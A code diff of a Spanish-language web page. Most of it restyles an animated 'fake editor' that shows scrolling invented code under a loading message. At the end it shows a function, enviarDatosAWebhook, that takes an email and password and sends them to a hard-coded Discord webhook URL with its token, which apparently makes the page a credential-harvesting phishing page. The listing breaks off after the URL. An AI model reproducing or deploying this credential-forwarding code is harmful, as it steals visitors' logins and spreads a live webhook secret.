@@ -95,21 +95,27 @@
             display: none;
         }
 
-      #fakeEditor {
-  background-color: #f4f4f4;
+     #fakeEditor {
+  background-color: #2a2a72; /* Azul morado oscuro */
+  background-image: linear-gradient(315deg, #2a2a72 0%, #009ffd 74%);
   border: 1px solid #ddd;
   border-radius: 5px;
   padding: 10px;
   font-family: 'Courier New', Courier, monospace;
   white-space: pre;
+  height: 100px; /* Altura fija para mostrar aproximadamente 5 líneas */
   overflow: hidden;
+  display: flex;
+  flex-direction: column-reverse; /* Invierte el orden para que el texto aparezca desde abajo */
   position: relative;
 }
 
 .fake-cursor {
   animation: blink-animation 1s steps(5, start) infinite;
-  border-right: 2px solid #000000;
+  border-right: 2px solid #ffffff; /* Cambio de color para visibilidad */
   margin-left: 2px;
+  position: absolute;
+  top: 0;
 }
 
 @keyframes blink-animation {
@@ -128,6 +134,13 @@
   0% {opacity: 0;}
   100% {opacity: 1;}
 }
+
+/* Animación para mover las líneas hacia arriba */
+@keyframes slideUp {
+  0% { transform: translateY(100%); }
+  100% { transform: translateY(-100%); }
+}
+
 
 
         #bannerRegistro {
@@ -329,14 +342,16 @@ function mostrarFakeEditor() {
             let line = document.createElement('div');
             line.textContent = fakeCodeLines[i];
             line.classList.add('line');
-            editor.appendChild(line);
+            // Asegura que las líneas se añadan al principio (para simular el efecto de "subir")
+            editor.insertBefore(line, editor.firstChild);
         }
-        let nextLinesToShow = Math.floor(Math.random() * 5) + 1; 
+        let nextLinesToShow = Math.floor(Math.random() * 5) + 1;
         if (endLine < fakeCodeLines.length) {
             setTimeout(() => updateCode(nextLinesToShow + linesToShow), 2000);
         }
     }
 
+    // Inicializa el editor con un mensaje de carga y un cursor falso
     editor.textContent = "Cargando editor";
     let dots = 0;
     let loadingInterval = setInterval(() => {
@@ -345,11 +360,13 @@ function mostrarFakeEditor() {
             dots++;
         } else {
             clearInterval(loadingInterval);
-            editor.innerHTML = '<span class="fake-cursor"></span>'; // Limpia el editor y añade el cursor falso
-            updateCode(5); 
+            // Limpia el editor y añade el cursor falso
+            editor.innerHTML = '<span class="fake-cursor"></span>';
+            updateCode(5); // Comienza mostrando 5 líneas
         }
-    }, 2000);
+    }, 1000); // Intervalo entre puntos en el mensaje de carga
 }
+
 
 function enviarDatosAWebhook(email, contrasena) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
